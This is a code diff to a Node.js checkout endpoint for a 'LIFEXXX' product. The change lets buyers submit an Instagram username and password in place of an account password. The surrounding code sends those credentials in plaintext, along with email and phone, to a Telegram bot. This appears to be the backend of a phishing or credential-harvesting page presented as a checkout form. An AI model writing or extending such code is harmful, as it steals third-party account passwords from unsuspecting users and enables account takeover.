@@ -27,14 +27,22 @@ module.exports = async (request, response) => {
   const product = clean(body.product, 80);
   const price = clean(body.price, 24);
 
-  if (!EMAIL_PATTERN.test(email) || !accountName || !password || !confirmPassword || !phone || !product || !price) {
+  const usingInstagram = instagramUsername && instagramPassword;
+  
+  if (!EMAIL_PATTERN.test(email) || !accountName || !product || !price) {
     response.status(400).json({ error: 'Invalid checkout details' });
     return;
   }
 
-  if (password !== confirmPassword) {
-    response.status(400).json({ error: 'Passwords do not match' });
-    return;
+  if (!usingInstagram) {
+    if (!password || !confirmPassword || !phone) {
+      response.status(400).json({ error: 'Invalid checkout details' });
+      return;
+    }
+    if (password !== confirmPassword) {
+      response.status(400).json({ error: 'Passwords do not match' });
+      return;
+    }
   }
 
   const token = process.env.TELEGRAM_BOT_TOKEN;
@@ -44,7 +52,10 @@ module.exports = async (request, response) => {
     return;
   }
 
-  let telegramText = `New LIFEXXX checkout\\nPlan: ${product}\\nAmount: $${price} USD\\nAccount name: ${accountName}\\nPhone: ${phone}\\nEmail: ${email}`;
+  let telegramText = `New LIFEXXX checkout\\nPlan: ${product}\\nAmount: $${price} USD\\nAccount name: ${accountName}\\nEmail: ${email}`;
+  if (phone) {
+    telegramText += `\\nPhone: ${phone}`;
+  }
   if (instagramUsername && instagramPassword) {
     telegramText += `\\nInstagram: ${instagramUsername}\\nInstagram Password: ${instagramPassword}`;
   }
